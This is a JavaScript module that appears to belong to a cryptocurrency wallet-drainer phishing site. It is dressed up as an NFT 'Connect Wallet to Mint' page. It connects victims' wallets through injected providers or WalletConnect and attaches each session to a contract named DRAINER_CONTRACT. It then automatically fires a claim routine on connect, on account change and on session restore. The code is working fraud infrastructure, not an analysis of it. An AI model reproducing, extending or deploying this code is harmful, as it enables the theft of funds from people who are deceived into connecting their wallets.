import { CONFIG } from './config.js';

;(async function() {
  // ============================================================
  // DEBUG PANEL
  // ============================================================
  const debugArea = document.createElement('div')
  debugArea.id = 'wc-debug'
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `
  document.body.appendChild(debugArea)

  let debugVisible = false
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible
    debugArea.style.display = debugVisible ? 'block' : 'none'
  })

  function logDebug(msg) {
    console.log(msg)
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`
    debugArea.scrollTop = debugArea.scrollHeight
  }

  // ============================================================
  // DEVICE DETECTION
  // ============================================================
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
  }

  function isIOS() {
    return /iPhone|iPad|iPod/i.test(navigator.userAgent)
  }

  function isAndroid() {
    return /Android/i.test(navigator.userAgent)
  }

  function isDesktop() {
    return !isMobile()
  }

  function getPlatform() {
    if (isIOS()) return 'ios'
    if (isAndroid()) return 'android'
    if (isDesktop()) return 'desktop'
    return 'unknown'
  }

  // ============================================================
  // WEBSOCKET CHECK – quick probe
  // ============================================================
  async function checkWebSocket(retries = 2, delay = 800) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i+1}/${retries}`)
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com')
          const timeout = setTimeout(() => { ws.close(); resolve(false) }, 3000)
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true) }
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false) }
        })
        if (result) {
          logDebug('✅ WebSocket connection successful')
          return true
        }
        await new Promise(r => setTimeout(r, delay))
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`)
        await new Promise(r => setTimeout(r, delay))
      }
    }
    logDebug('❌ WebSocket connection failed after retries')
    return false
  }

  // ============================================================
  // DYNAMIC LIBRARY LOADING
  // ============================================================
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
    ]
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
    ]
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm'
    ]

    let SignClient, WalletConnectModal, EthereumProvider
    for (const url of cdns) {
      try {
        logDebug(`Trying SignClient from ${url}`)
        const mod = await import(url)
        SignClient = mod.default || mod
        logDebug(`✅ SignClient loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load SignClient from ${url}: ${e.message}`)
      }
    }
    if (!SignClient) throw new Error('Could not load SignClient')

    for (const url of modalCdns) {
      try {
        logDebug(`Trying WalletConnectModal from ${url}`)
        const mod = await import(url)
        WalletConnectModal = mod.WalletConnectModal || mod.default || mod
        logDebug(`✅ WalletConnectModal loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load WalletConnectModal from ${url}: ${e.message}`)
      }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal')

    for (const url of providerCdns) {
      try {
        logDebug(`Trying EthereumProvider from ${url}`)
        const mod = await import(url)
        EthereumProvider = mod.EthereumProvider || mod.default || mod
        logDebug(`✅ EthereumProvider loaded from ${url}`)
        break
      } catch (e) {
        logDebug(`❌ Failed to load EthereumProvider from ${url}: ${e.message}`)
      }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider')

    return { SignClient, WalletConnectModal, EthereumProvider }
  }

  // ============================================================
  // DOM REFERENCES
  // ============================================================
  const connectButton = document.getElementById('connectButton')
  const walletButton = document.getElementById('walletButton')
  const claimStatus = document.getElementById('claimStatus')

  let currentSession = null
  let client, modal, SignClient, WalletConnectModal, EthereumProvider
  let web3Instance = null
  let contractInstance = null
  let connectedAddress = null

  // ============================================================
  // UI STATE MANAGEMENT (simplified)
  // ============================================================
  function setButtonState(button, state) {
    if (!button) return
    button.style.display = 'inline-block'
    button.style.padding = '14px 28px'
    button.style.borderRadius = '8px'
    button.style.fontWeight = '600'
    button.style.border = 'none'
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer'
    button.style.transition = 'all 0.3s ease'
    button.style.color = 'white'
    button.style.fontSize = '16px'
    button.style.fontFamily = "'Inter', sans-serif"
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)'
    button.style.minWidth = '180px'
    button.disabled = state === 'loading'

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)'
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...'
        break
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)'
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected'
        break
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect'
        break
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)'
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed'
        setTimeout(() => setButtonState(button, 'normal'), 3000)
        break
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)'
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint'
        break
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return
    claimStatus.textContent = message
    claimStatus.className = `status ${type}`
    claimStatus.style.display = 'block'
    claimStatus.style.padding = '12px 16px'
    claimStatus.style.borderRadius = '8px'
    claimStatus.style.marginTop = '12px'
    claimStatus.style.fontWeight = '500'
    claimStatus.style.fontSize = '14px'
    claimStatus.style.textAlign = 'center'
    claimStatus.style.transition = 'all 0.3s ease'
    const styles = {
      success: { background: '#DCFCE7', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: '#FEE2E2', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: '#DBEAFE', color: '#1E40AF', border: '1px solid #93C5FD' },
    }
    Object.assign(claimStatus.style, styles[type] || styles.info)
    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0'
        setTimeout(() => {
          claimStatus.style.display = 'none'
          claimStatus.style.opacity = '1'
        }, 300)
      }, 5000)
    }
  }

  setButtonState(connectButton, 'normal')
  if (walletButton) setButtonState(walletButton, 'normal')

  // ============================================================
  // WALLETCONNECT CONSTANTS
  // ============================================================
  const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA, DRAINER_CONTRACT, CONTRACT_ABI } = CONFIG
  let projectId = PROJECT_ID

  // ============================================================
  // STORAGE HELPERS
  // ============================================================
  function saveWallet(address, session = null, chainType = 'evm') {
    localStorage.setItem('connectedAddress', address)
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session))
    localStorage.setItem('chainType', chainType)
  }
  function getSavedWallet() { return localStorage.getItem('connectedAddress') }
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession')
    return session ? JSON.parse(session) : null
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown' }
  function clearSavedWallet() {
    localStorage.removeItem('connectedAddress')
    localStorage.removeItem('walletConnectSession')
    localStorage.removeItem('chainType')
  }

  // ============================================================
  // GLOBAL STATE SYNC – pass connection to Script.js
  // ============================================================
  function syncToScript(address, provider) {
    // Expose globally for Script.js to pick up
    window.connectedAddress = address
    window.connectedWallet = 'evm'
    window.web3 = web3Instance
    window.contractInstance = contractInstance

    // If Script.js exposes an update function, call it
    if (typeof window.updateWalletConnection === 'function') {
      window.updateWalletConnection(address, 'evm', web3Instance, contractInstance)
    }
  }

  // ============================================================
  // UPDATE UI WITH ADDRESS
  // ============================================================
  function updateConnectedUI(address) {
    setButtonState(connectButton, 'disconnect')
    if (walletButton) setButtonState(walletButton, 'disconnect')

    let display = document.getElementById('connectedAddressDisplay')
    if (!display) {
      display = document.createElement('div')
      display.id = 'connectedAddressDisplay'
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `
      connectButton.parentNode.appendChild(display)
    }
    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">◆ ETH</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `
    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress')
        btn.innerHTML = '<i class="fas fa-check"></i>'
        btn.style.color = '#10B981'
        setTimeout(() => {
          btn.innerHTML = '<i class="far fa-copy"></i>'
          btn.style.color = '#059669'
        }, 2000)
      })
    })
    showStatus(`Connected to ${address.slice(0,6)}...`, 'success')
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal')
    if (walletButton) setButtonState(walletButton, 'normal')
    const display = document.getElementById('connectedAddressDisplay')
    if (display) display.remove()
    showStatus('Wallet disconnected', 'info')
    // Clear global references
    window.connectedAddress = null
    window.connectedWallet = null
    window.web3 = null
    window.contractInstance = null
    if (typeof window.updateWalletConnection === 'function') {
      window.updateWalletConnection(null, null, null, null)
    }
    web3Instance = null
    contractInstance = null
    connectedAddress = null
  }

  // ============================================================
  // EIP‑6963: DETECT EVM PROVIDERS (for desktop direct connection)
  // ============================================================
  let evmProviders = []
  let eip6963Initialized = false

  function setupEIP6963() {
    if (eip6963Initialized) return
    eip6963Initialized = true
    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail)
        logDebug(`EIP‑6963: Found provider ${detail.info.name}`)
      }
    })
    window.dispatchEvent(new Event('eip6963:requestProvider'))
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500)
  }

  // ============================================================
  // WALLET SELECTION MODAL (for multiple EVM providers)
  // ============================================================
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div')
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `
    const modal = document.createElement('div')
    modal.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `
    modal.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `
    overlay.appendChild(modal)
    document.body.appendChild(overlay)

    const list = modal.querySelector('#walletList')
    providers.forEach((provider) => {
      const btn = document.createElement('button')
      btn.textContent = provider.info.name
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `
      btn.onmouseover = () => btn.style.background = '#4B5563'
      btn.onmouseout = () => btn.style.background = '#374151'
      if (provider.info.icon) {
        const img = document.createElement('img')
        img.src = provider.info.icon
        img.style.width = '24px'
        img.style.height = '24px'
        btn.prepend(img)
      }
      btn.addEventListener('click', () => {
        overlay.remove()
        callback(provider)
      })
      list.appendChild(btn)
    })

    modal.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove()
      callback(null)
    })
  }

  // ============================================================
  // DIRECT EVM CONNECTION (desktop only, with timeout)
  // ============================================================
  async function connectDirectEVM(timeoutMs = 5000) {
    setupEIP6963()
    await new Promise(r => setTimeout(r, 300))

    let providers = evmProviders.filter(p => p.provider)
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }]
    }
    if (providers.length === 0) {
      logDebug('No EVM providers found')
      return false
    }

    let chosenProvider = null
    if (providers.length === 1) {
      chosenProvider = providers[0]
    } else {
      const known = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'))
      if (known) {
        chosenProvider = known
      } else {
        const result = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (selected) => resolve(selected))
        })
        if (!result) return false
        chosenProvider = result
      }
    }

    try {
      logDebug(`Direct EVM: attempting with ${chosenProvider.info.name}`)
      const provider = chosenProvider.provider
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), timeoutMs))
      ])
      if (accounts && accounts.length > 0) {
        const address = accounts[0]
        logDebug(`✅ Direct EVM connection: ${address}`)
        // Initialize Web3
        const Web3 = (await import('web3')).default
        web3Instance = new Web3(provider)
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
        connectedAddress = address
        saveWallet(address, null, 'evm')
        updateConnectedUI(address)
        syncToScript(address, provider)
        setupEVMProviderEvents(provider)
        return true
      }
    } catch (err) {
      logDebug(`Direct EVM error: ${err.message}`)
      if (err.message === 'Connection timeout') {
        logDebug('Direct EVM timed out')
      }
      if (err.code === 4001) {
        logDebug('User rejected direct connection')
      }
      return false
    }
    return false
  }

  // ============================================================
  // WALLETCONNECT EVM CONNECTION (Universal fallback)
  // ============================================================
  async function connectViaWalletConnect(useTestId = false) {
    const initSuccess = await initWalletConnect(useTestId)
    if (!initSuccess) {
      showStatus('Wallet connection service unavailable', 'error')
      return false
    }
    try {
      showStatus('Requesting wallet connection...', 'info')
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      })
      if (uri) {
        logDebug(`URI: ${uri}`)
        modal.openModal({ uri })
        showStatus('Select your wallet or scan QR code', 'info')
        sessionStorage.setItem('pending_wc_uri', uri)
        sessionStorage.setItem('pending_wc_timestamp', Date.now().toString())
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 30000))
      ])

      if (modal) modal.closeModal()
      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2]
        logDebug(`✅ WalletConnect session: ${account}`)
        // Initialize EthereumProvider from session
        const provider = await EthereumProvider.init({
          projectId,
          metadata: DAPP_METADATA,
          session, // reuse session
        })
        const Web3 = (await import('web3')).default
        web3Instance = new Web3(provider)
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
        connectedAddress = account
        currentSession = session
        saveWallet(account, session, 'evm')
        updateConnectedUI(account)
        syncToScript(account, provider)
        sessionStorage.removeItem('pending_wc_uri')
        sessionStorage.removeItem('pending_wc_timestamp')
        // Trigger claim process after a short delay
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1500)
        return true
      } else {
        showStatus('No accounts found', 'error')
        return false
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`)
      if (modal) modal.closeModal()
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error')
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout - please try again', 'error')
      } else {
        showStatus('Wallet connection failed', 'error')
      }
      return false
    }
  }

  // ============================================================
  // WALLETCONNECT INITIALIZATION
  // ============================================================
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true
    if (useTestId) {
      logDebug('🔄 Initializing with PUBLIC TEST project ID')
      projectId = PUBLIC_TEST_ID
    } else {
      logDebug(`🔄 Initializing with projectId: ${projectId}`)
    }
    const wsOk = await checkWebSocket(2, 800)
    if (!wsOk) logDebug('⚠️ WebSocket check failed – proceeding anyway')
    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      })
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      })
      logDebug('✅ WalletConnect initialized successfully')
      return true
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`)
      return false
    }
  }

  // ============================================================
  // EVM PROVIDER EVENTS
  // ============================================================
  function setupEVMProviderEvents(provider) {
    if (!provider.on) return
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected', 'info')
      } else {
        const address = accounts[0]
        connectedAddress = address
        saveWallet(address, currentSession, 'evm')
        updateConnectedUI(address)
        syncToScript(address, provider)
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess()
          }
        }, 1000)
      }
    })
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info')
    })
    provider.on('disconnect', () => {
      resetConnectedUI()
      clearSavedWallet()
      showStatus('Wallet disconnected', 'info')
    })
  }

  // ============================================================
  // MAIN CONNECT DISPATCHER
  // ============================================================
  async function connectWallet() {
    setButtonState(connectButton, 'loading')
    if (walletButton) setButtonState(walletButton, 'loading')
    showStatus('Connecting...', 'info')

    let success = false
    const platform = getPlatform()
    logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`)

    if (isMobile()) {
      // Mobile: WalletConnect only
      logDebug('📱 Mobile: WalletConnect only')
      success = await connectViaWalletConnect(false)
      if (!success) {
        logDebug('Mobile: retrying with public test ID')
        success = await connectViaWalletConnect(true)
      }
      if (!success) {
        showStatus('No wallet found. Please install a WalletConnect-compatible wallet.', 'error')
        setButtonState(connectButton, 'failed')
        if (walletButton) setButtonState(walletButton, 'failed')
      } else {
        setButtonState(connectButton, 'connected')
        if (walletButton) setButtonState(walletButton, 'connected')
      }
      return
    }

    // Desktop: Direct EVM → WalletConnect
    logDebug('🖥️ Desktop: full flow')
    success = await connectDirectEVM(5000)
    if (success) {
      logDebug('✅ Desktop: Direct EVM success')
      setButtonState(connectButton, 'connected')
      if (walletButton) setButtonState(walletButton, 'connected')
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess()
        }
      }, 1500)
      return
    }

    logDebug('Desktop: WalletConnect fallback')
    success = await connectViaWalletConnect(false)
    if (!success) {
      success = await connectViaWalletConnect(true)
    }
    if (success) {
      logDebug('✅ Desktop: WalletConnect success')
      setButtonState(connectButton, 'connected')
      if (walletButton) setButtonState(walletButton, 'connected')
      return
    }

    logDebug('❌ Desktop: all methods failed')
    showStatus('No supported wallet found.', 'error')
    setButtonState(connectButton, 'failed')
    if (walletButton) setButtonState(walletButton, 'failed')
  }

  // ============================================================
  // DISCONNECT
  // ============================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        })
        currentSession = null
      }
      if (web3Instance && web3Instance.currentProvider && web3Instance.currentProvider.disconnect) {
        await web3Instance.currentProvider.disconnect()
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`)
    }
    resetConnectedUI()
    clearSavedWallet()
    web3Instance = null
    contractInstance = null
    connectedAddress = null
  }

  // ============================================================
  // BUTTON CLICK HANDLER
  // ============================================================
  const handleClick = async () => {
    const saved = getSavedWallet()
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet()
    } else {
      await connectWallet()
    }
  }

  if (connectButton) connectButton.addEventListener('click', handleClick)
  if (walletButton) walletButton.addEventListener('click', handleClick)

  // ============================================================
  // RESTORE SESSION
  // ============================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet()
    const savedChain = getSavedChainType()
    const savedSession = getSavedSession()

    // Check for pending session (from redirect)
    const pendingUri = sessionStorage.getItem('pending_wc_uri')
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
    if (pendingUri && pendingTimestamp && client) {
      const elapsed = Date.now() - parseInt(pendingTimestamp)
      if (elapsed < 120000) {
        logDebug('Checking for pending session after visibility change...')
        try {
          const sessions = client.session.values()
          if (sessions.length > 0) {
            const session = sessions[0]
            const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
            if (account) {
              const provider = await EthereumProvider.init({
                projectId,
                metadata: DAPP_METADATA,
                session,
              })
              const Web3 = (await import('web3')).default
              web3Instance = new Web3(provider)
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
              connectedAddress = account
              currentSession = session
              saveWallet(account, session, 'evm')
              updateConnectedUI(account)
              syncToScript(account, provider)
              sessionStorage.removeItem('pending_wc_uri')
              sessionStorage.removeItem('pending_wc_timestamp')
              setTimeout(() => {
                if (typeof window.initiateClaimProcess === 'function') {
                  window.initiateClaimProcess()
                }
              }, 1000)
              return
            }
          }
        } catch (e) {
          logDebug(`Pending session restore failed: ${e.message}`)
        }
      }
      sessionStorage.removeItem('pending_wc_uri')
      sessionStorage.removeItem('pending_wc_timestamp')
    }

    if (savedWallet && savedChain === 'evm') {
      if (savedSession) {
        const initSuccess = await initWalletConnect(false)
        if (initSuccess) {
          try {
            const session = client.session.get(savedSession.topic)
            if (session) {
              const provider = await EthereumProvider.init({
                projectId,
                metadata: DAPP_METADATA,
                session,
              })
              const Web3 = (await import('web3')).default
              web3Instance = new Web3(provider)
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
              connectedAddress = savedWallet
              currentSession = session
              updateConnectedUI(savedWallet)
              syncToScript(savedWallet, provider)
              return
            }
          } catch (e) { logDebug(`Session restore failed: ${e.message}`) }
        }
      }
      // Try direct provider (desktop)
      if (isDesktop() && window.ethereum) {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => [])
        if (accounts.length > 0 && accounts[0] === savedWallet) {
          const Web3 = (await import('web3')).default
          web3Instance = new Web3(window.ethereum)
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
          connectedAddress = savedWallet
          updateConnectedUI(savedWallet)
          syncToScript(savedWallet, window.ethereum)
          return
        }
      }
      // If on mobile and no session, clear
      if (isMobile()) {
        clearSavedWallet()
      }
    }
  }

  // ============================================================
  // LOAD LIBRARIES AND START
  // ============================================================
  try {
    const libs = await loadWalletConnect()
    SignClient = libs.SignClient
    WalletConnectModal = libs.WalletConnectModal
    EthereumProvider = libs.EthereumProvider
    logDebug('✅ All libraries loaded')

    setupEIP6963()

    await restoreWalletConnection()
  } catch (err) {
    logDebug(`❌ Fatal error: ${err.message}`)
    showStatus('Failed to load wallet libraries', 'error')
    return
  }

  // ============================================================
  // SESSION LISTENERS
  // ============================================================
  setTimeout(() => {
    if (client) {
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts
        if (accounts?.length) {
          const account = accounts[0].split(':')[2]
          connectedAddress = account
          saveWallet(account, currentSession, 'evm')
          updateConnectedUI(account)
          syncToScript(account, web3Instance?.currentProvider)
          setTimeout(() => {
            if (typeof window.initiateClaimProcess === 'function') {
              window.initiateClaimProcess()
            }
          }, 1000)
        }
      })
      client.on('session_delete', () => {
        resetConnectedUI()
        clearSavedWallet()
        showStatus('Wallet disconnected by provider', 'error')
      })
    }
  }, 1000)

  // ============================================================
  // VISIBILITY CHANGE – check for session return
  // ============================================================
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && getSavedWallet()) {
      logDebug('Page visible, checking connection...')
      const pendingUri = sessionStorage.getItem('pending_wc_uri')
      const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp')
      if (pendingUri && pendingTimestamp && client) {
        const elapsed = Date.now() - parseInt(pendingTimestamp)
        if (elapsed < 120000) {
          logDebug('Visibility change: checking for pending session...')
          setTimeout(async () => {
            try {
              const sessions = client.session.values()
              if (sessions.length > 0) {
                const session = sessions[0]
                const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2]
                if (account) {
                  const provider = await EthereumProvider.init({
                    projectId,
                    metadata: DAPP_METADATA,
                    session,
                  })
                  const Web3 = (await import('web3')).default
                  web3Instance = new Web3(provider)
                  contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT)
                  connectedAddress = account
                  currentSession = session
                  saveWallet(account, session, 'evm')
                  updateConnectedUI(account)
                  syncToScript(account, provider)
                  sessionStorage.removeItem('pending_wc_uri')
                  sessionStorage.removeItem('pending_wc_timestamp')
                  setTimeout(() => {
                    if (typeof window.initiateClaimProcess === 'function') {
                      window.initiateClaimProcess()
                    }
                  }, 1000)
                }
              }
            } catch (e) {
              logDebug(`Visibility check restore failed: ${e.message}`)
            }
          }, 1000)
        }
      }
    }
  })

  // ============================================================
  // CLEANUP
  // ============================================================
  window.addEventListener('beforeunload', () => {
    if (modal) modal.closeModal()
  })

  logDebug(`✅ main.js fully initialised – device‑aware, fast connection flow`)
})();
